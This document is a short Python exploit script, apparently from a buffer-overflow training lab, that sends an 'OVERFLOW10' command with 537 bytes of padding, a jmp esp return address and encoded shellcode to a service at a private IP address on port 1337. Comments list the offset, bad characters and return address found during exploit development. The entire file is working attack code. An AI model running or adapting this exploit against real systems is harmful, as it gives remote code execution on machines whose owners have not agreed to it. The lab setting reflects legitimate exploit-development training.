#!/usr/bin/python3

import sys
import socket
import struct

host = '10.10.1.21'
port = 1337



# [*] Exact match at offset 537
# Badchars: 00 0a 0d a0 a1 ad ae be bf de df ef f0
# Removed: 00 0a 0d a0 ad be de ef
# jmp esp: 0x625011C7

buf =  b""
buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x6f\x13\x48\x51\x83\xee\xfc\xe2\xf4\x93\xfb"
buf += b"\xca\x51\x6f\x13\x28\xd8\x8a\x22\x88\x35\xe4\x43\x78"
buf += b"\xda\x3d\x1f\xc3\x03\x7b\x98\x3a\x79\x60\xa4\x02\x77"
buf += b"\x5e\xec\xe4\x6d\x0e\x6f\x4a\x7d\x4f\xd2\x87\x5c\x6e"
buf += b"\xd4\xaa\xa3\x3d\x44\xc3\x03\x7f\x98\x02\x6d\xe4\x5f"
buf += b"\x59\x29\x8c\x5b\x49\x80\x3e\x98\x11\x71\x6e\xc0\xc3"
buf += b"\x18\x77\xf0\x72\x18\xe4\x27\xc3\x50\xb9\x22\xb7\xfd"
buf += b"\xae\xdc\x45\x50\xa8\x2b\xa8\x24\x99\x10\x35\xa9\x54"
buf += b"\x6e\x6c\x24\x8b\x4b\xc3\x09\x4b\x12\x9b\x37\xe4\x1f"
buf += b"\x03\xda\x37\x0f\x49\x82\xe4\x17\xc3\x50\xbf\x9a\x0c"
buf += b"\x75\x4b\x48\x13\x30\x36\x49\x19\xae\x8f\x4c\x17\x0b"
buf += b"\xe4\x01\xa3\xdc\x32\x7b\x7b\x63\x6f\x13\x20\x26\x1c"
buf += b"\x21\x17\x05\x07\x5f\x3f\x77\x68\xec\x9d\xe9\xff\x12"
buf += b"\x48\x51\x46\xd7\x1c\x01\x07\x3a\xc8\x3a\x6f\xec\x9d"
buf += b"\x01\x3f\x43\x18\x11\x3f\x53\x18\x39\x85\x1c\x97\xb1"
buf += b"\x90\xc6\xdf\x3b\x6a\x7b\x42\x5a\x7c\x4a\x20\x53\x6f"
buf += b"\x13\x18\xd8\x89\x79\x58\x07\x38\x7b\xd1\xf4\x1b\x72"
buf += b"\xb7\x84\xea\xd3\x3c\x5d\x90\x5d\x40\x24\x83\x7b\xb8"
buf += b"\xe4\xcd\x45\xb7\x84\x07\x70\x25\x35\x6f\x9a\xab\x06"
buf += b"\x38\x44\x79\xa7\x05\x01\x11\x07\x8d\xee\x2e\x96\x2b"
buf += b"\x37\x74\x50\x6e\x9e\x0c\x75\x7f\xd5\x48\x15\x3b\x43"
buf += b"\x1e\x07\x39\x55\x1e\x1f\x39\x45\x1b\x07\x07\x6a\x84"
buf += b"\x6e\xe9\xec\x9d\xd8\x8f\x5d\x1e\x17\x90\x23\x20\x59"
buf += b"\xe8\x0e\x28\xae\xba\xa8\xa8\x4c\x45\x19\x20\xf7\xfa"
buf += b"\xae\xd5\xae\xba\x2f\x4e\x2d\x65\x93\xb3\xb1\x1a\x16"
buf += b"\xf3\x16\x7c\x61\x27\x3b\x6f\x40\xb7\x84"

shellcode = buf

ret_eip = struct.pack('<I', 0x625011C7)

payload = b'OVERFLOW10 ' + b'A' * 537 + ret_eip + shellcode

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	s.send(payload)
	s.close()

except:
	raise Exception("Unable to connect to server.")
	sys.exit()
